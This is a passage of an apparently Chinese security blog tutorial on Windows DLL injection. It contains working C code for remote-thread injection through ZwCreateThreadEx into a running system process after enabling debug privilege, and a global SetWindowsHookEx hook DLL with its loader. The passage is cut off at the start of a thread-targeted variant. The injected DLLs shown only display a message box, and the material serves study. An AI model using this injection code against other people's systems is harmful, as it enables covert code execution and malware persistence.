class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> DWORD(WINAPI* typedef_ZwCreateThreadEx)(<br>    PHANDLE ThreadHandle,<br>    ACCESS_MASK DesiredAccess,<br>    LPVOID ObjectAttributes,<br>    HANDLE ProcessHandle,<br>    LPTHREAD_START_ROUTINE lpStartAddress,<br>    LPVOID lpParameter,<br>    ULONG CreateThreadFlags,<br>    SIZE_T ZeroBits,<br>    SIZE_T StackSize,<br>    SIZE_T MaximumStackSize,<br>    LPVOID pUnkown);<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> DWORD(WINAPI* typedef_ZwCreateThreadEx)(<br>    PHANDLE ThreadHandle,<br>    ACCESS_MASK DesiredAccess,<br>    LPVOID ObjectAttributes,<br>    HANDLE ProcessHandle,<br>    LPTHREAD_START_ROUTINE lpStartAddress,<br>    LPVOID lpParameter,<br>    <span class="hljs-type">BOOL</span> CreateSuspended,<br>    DWORD dwStackSize,<br>    DWORD dw1,<br>    DWORD dw2,<br>    LPVOID pUnkown);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>    DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>        printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>    &#125;<br>    P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>    Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>            ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>    CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">// 提权函数</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivileg() &#123;<br>    HANDLE hToken; <span class="hljs-comment">//初始化句柄空间，等下放句柄</span><br>    <span class="hljs-type">BOOL</span> fok = <span class="hljs-literal">FALSE</span>; <span class="hljs-comment">//初始化状态，现在debug权限还未开启</span><br>    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br><br>        TOKEN_PRIVILEGES tp;<br>        tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>        LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>        AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        fok = (GetLastError() == ERROR_SUCCESS);<br>        CloseHandle(hToken);<br><br><br><br>    &#125;<span class="hljs-comment">//打开当前进程的，获取令牌，并存入hToken中</span><br>    <span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-comment">//注入函数</span><br><span class="hljs-type">BOOL</span> zwCreatThreadExInject(<span class="hljs-type">int</span> PID, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span>* pszDllFileName) &#123;<br>    EnableDebugPrivileg();<br>    HANDLE hRemoteThread;<br>    DWORD dwStatus = <span class="hljs-number">0</span>;<br><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, PID);<br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        printf(<span class="hljs-string">&quot;OpenProcess error : %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    SIZE_T dwSize = (strlen(pszDllFileName) + <span class="hljs-number">1</span>);<br>    LPVOID pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br>        printf(<span class="hljs-string">&quot;VirtualAllocEx error\n&quot;</span>);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        printf(<span class="hljs-string">&quot;WriteProcessMemory error\n&quot;</span>);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    HMODULE hNtdllDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hNtdllDll) &#123;<br>        printf(<span class="hljs-string">&quot;Load ntdll.dll error\n&quot;</span>);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFuncProcAddr) &#123;<br>        printf(<span class="hljs-string">&quot;Get LoadLibraryA error\n&quot;</span>);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == ZwCreateThreadEx) &#123;<br>        printf(<span class="hljs-string">&quot;GetProcAddress error\n&quot;</span>);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess,<br>        (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (dwStatus != <span class="hljs-number">0</span>) &#123;<br>        printf(<span class="hljs-string">&quot;ZwCreateThreadEx error: %d\n&quot;</span>, dwStatus);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    CloseHandle(hProcess);<br>    FreeLibrary(hNtdllDll);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-type">int</span> pid = GetProcessPID(<span class="hljs-string">&quot;unsecapp.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;未找到进程\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br><br>    <span class="hljs-type">BOOL</span> bRet = zwCreatThreadExInject(pid, dll_path);<br>    <span class="hljs-keyword">if</span> (bRet==<span class="hljs-literal">FALSE</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Inject dll failed\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;Inject dll successfully\n&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022312910.png" alt="image-20251002231206790"></p><h1 id="Hook注入"><a href="#Hook注入" class="headerlink" title="Hook注入"></a>Hook注入</h1><p>Hook注入利用的Windows操作系统的一个机制</p><h2 id="一、什么是-Hook？"><a href="#一、什么是-Hook？" class="headerlink" title="一、什么是 Hook？"></a><strong>一、什么是 Hook？</strong></h2><p>首先，我们从“Hook”这个词本身说起。在计算机领域，Hook 的字面意思就是“钩子”。你可以想象一下，在一个程序的执行流程中，就像有一条线在前进。而“钩子”的作用，就是在这条线的某个特定位置，挂上一个我们自己的函数（或者说一段代码）。</p><p>当程序执行到这个“挂钩”的位置时，它不会直接继续原来的流程，而是会先执行我们挂上去的函数。等我们的函数执行完毕后，它再决定是继续原来的流程，还是做一些其他的操作。</p><p><strong>核心思想：</strong> 在程序执行的某个关键点，插入自定义代码，从而改变或增强程序的行为。</p><h2 id="二、为什么需要-Hook？"><a href="#二、为什么需要-Hook？" class="headerlink" title="二、为什么需要 Hook？"></a><strong>二、为什么需要 Hook？</strong></h2><p>Hook 的出现，主要是为了解决以下几个问题：</p><ol><li><strong>扩展功能：</strong> 很多时候，我们希望在不修改原有程序源代码的情况下，为它增加新的功能。比如，一个现有的软件，我们想给它添加一个统计用户操作的功能，或者在某个事件发生时发送通知。</li><li><strong>调试和分析：</strong> 在程序运行过程中，我们可能想知道某个函数何时被调用、参数是什么、返回值是什么。Hook 可以在不修改程序的情况下，帮助我们监视这些信息。</li><li><strong>拦截和修改：</strong> 有些场景下，我们甚至希望拦截程序的某个操作，并对其进行修改。比如，拦截一个文件写入操作，然后修改写入的内容；或者拦截一个网络请求，修改请求的参数。</li><li><strong>兼容性：</strong> 有时，为了让新旧系统或不同模块之间更好地协同工作，Hook 也可以作为一种桥梁。</li></ol><h2 id="三-核心原理和异同"><a href="#三-核心原理和异同" class="headerlink" title="三.核心原理和异同"></a>三.核心原理和异同</h2><p>Hook注入是利用 Windows 提供的<strong>消息挂钩机制</strong>，开发者编写包含 <strong>HookProc</strong> 的 <strong>DLL（动态链接库）</strong>，调用 <strong>SetWindowsHookEx</strong>（例如 <strong>WH_GETMESSAGE</strong>、<strong>WH_KEYBOARD_LL</strong> 等钩子类型）后，系统会自动将该 DLL 注入到指定的<strong>线程 &#x2F; 进程</strong>中。</p><p>注入这个dll是Windows 自己自动加载到进程或线程里面的。根据这种机制我们也分为 全局注入(所有进程都插一遍)和消息注入（只插入指定的进程）</p><h2 id="需要使用的windows-api"><a href="#需要使用的windows-api" class="headerlink" title="需要使用的windows api"></a>需要使用的windows api</h2><p>1.设置钩子的API</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HHOOK WINAPI SetWindowsHookEx（<br>  <span class="hljs-variable">_In_</span>  int    idHook，　　　　　　　　　　　　<span class="hljs-comment">//设置钩子的类型.意思就是我要设置的钩子是什么钩子. 可以是监视窗口过程.可以是监视消息队列.</span><br>  <span class="hljs-variable">_In_</span> HOOKPROC lpfn，　　　　　　　　　　　　 <span class="hljs-comment">//根据钩子类型.设置不同的回调函数.</span><br>  <span class="hljs-variable">_In_</span> HINSTANCE hMod，　　　　　　　　　　　　<span class="hljs-comment">//钩子设置的Dll实例句柄,就是DLL的句柄</span><br>  <span class="hljs-variable">_In_</span> DWORD dwThreadId　　　　　　　　　　   <span class="hljs-comment">//设置钩子的线程ID. 如果为0 则设置为全局钩子.</span><br>）;<br>　　　<br></code></pre></td></tr></table></figure><p>2.取消钩子的API</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">BOOL</span> WINAPI UnhookWindowsHookEx（<br>  _In_ HHOOK hhk                        <span class="hljs-comment">//参数一是 SetWindowHookEx的返回值.也就是钩子过程句柄. </span><br>）;                  <br></code></pre></td></tr></table></figure><p>3.钩子回调</p><p>钩子回调根据SetWindowsHookEx参数1来设定的。</p><p>idHook 要安装的钩子(HOOK)的类型，它决定了 HOOKPROC 被调用的时机，可选参数如下。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>WH_MSGFILTER &#x3D; -1</td><td>线程级，截获用户与控件交互的消息</td></tr><tr><td>WH_JOURNALRECORD &#x3D; 0</td><td>系统级，记录所有消息队列送出的输入消息</td></tr><tr><td>WH_JOURNALPLAYBACK &#x3D; 1</td><td>系统级，回放由WH_JOURNALRECORD记录的消息</td></tr><tr><td>WH_KEYBOARD &#x3D; 2</td><td>系统级或线程级，截获键盘消息</td></tr><tr><td>WH_GETMESSAGE &#x3D; 3</td><td>系统级或线程级，截获从消息队列送出的消息</td></tr><tr><td>WH_CALLWNDPROC &#x3D; 4</td><td>系统级或线程级，截获发送到目标窗口的消息</td></tr><tr><td>WH_CBT &#x3D; 5</td><td>系统级或线程级，截获系统基本消息例如：窗口的创建，激活，关闭，最大&#x2F;最小化，移动等</td></tr><tr><td>WH_SYSMSGFILTER &#x3D; 6</td><td>系统级，截获系统范围内用户与控件交互的消息</td></tr><tr><td>WH_MOUSE &#x3D; 7</td><td>系统级或线程级，截获鼠标消息</td></tr><tr><td>WH_HARDWARE &#x3D; 8</td><td>系统级或线程级，截获非标准硬件(非鼠标，键盘)的消息</td></tr><tr><td>WH_DEBUG &#x3D; 9</td><td>系统级或线程级，在其它钩子调用前调用，用于调试钩子</td></tr><tr><td>WH_SHELL &#x3D; 10</td><td>系统级或线程级，截获发给外壳应用程序的消息</td></tr><tr><td>WH_FOREGROUNDIDLE &#x3D; 11</td><td>系统级或线程级，在程序前台线程空闲时调用</td></tr><tr><td>WH_CALLWNDPROCRET &#x3D; 12</td><td>系统级或线程级，截获目标窗口处理完的消息在SendMessage被调用后发生</td></tr><tr><td>WH_KEYBOARD_LL &#x3D; 13</td><td>系统级，截获全局键盘消息</td></tr><tr><td>WH_MOUSE_LL &#x3D; 14</td><td>系统级，截获全局鼠标消息</td></tr></tbody></table><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp">LRESULT CALLBACK MyProc（         <span class="hljs-comment">//这个回调函数里面写我们的代码.</span><br>  _In_  <span class="hljs-keyword">int</span>     nCode，<br>  _In_ <span class="hljs-keyword">WPARAM</span> <span class="hljs-keyword">wParam</span>，<br>  _In_ <span class="hljs-keyword">LPARAM</span> <span class="hljs-keyword">lParam</span><br>）<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="全局Hook注入"><a href="#全局Hook注入" class="headerlink" title="全局Hook注入"></a>全局Hook注入</h2><p>dll代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br>HHOOK hHook=<span class="hljs-literal">NULL</span>;<br>HINSTANCE hInst = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">HookProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook, nCode, wParam, lParam);<span class="hljs-comment">//给下一个钩子或者应用程序继续处理消息</span><br><br><br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstart</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//WH_GETMESSAGE钩住所有消息</span><br>    hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, HookProc, hInst, <span class="hljs-number">0</span>);<br><br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 卸载钩子</span><br>    <span class="hljs-keyword">if</span> (hHook) &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook);<br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        hInst=hModule;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>注入c 文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*hookOn)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*hookOff)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>HMODULE hmod = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;F:\\c\\hookdll\\x64\\Release\\hookdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hmod == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hmod LoadLibraryA Failed\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>hookOn hook_on = (hookOn)<span class="hljs-built_in">GetProcAddress</span>(hmod, <span class="hljs-string">&quot;Hookstart&quot;</span>);<br><span class="hljs-keyword">if</span> (hook_on == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hook_on GetProcAddress Failed\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>hookOff hook_off = (hookOff)<span class="hljs-built_in">GetProcAddress</span>(hmod, <span class="hljs-string">&quot;Hookstop&quot;</span>);<br>  <span class="hljs-keyword">if</span> (hook_off == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hook_off GetProcAddress Failed\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">hook_on</span>();<br><span class="hljs-built_in">getchar</span>();<br><span class="hljs-built_in">hook_off</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不是主播不会截图，是全局钩子给我把截图也卡住了。所以只能照相，兄弟们也能看见，一堆程序全钩住了。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031528552.png" alt="image-20251003152834025"></p><h2 id="指定线程HOOK注入"><a href="#指定线程HOOK注入" class="headerlink" title="指定线程HOOK注入"></a>指定线程HOOK注入</h2><p>重要的点其实就是将dll文件里面的这个参数改为指定的PID</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031535367.png" alt="image-20251003153530215"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">GetProcessPID</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* lpProcessName)</span> 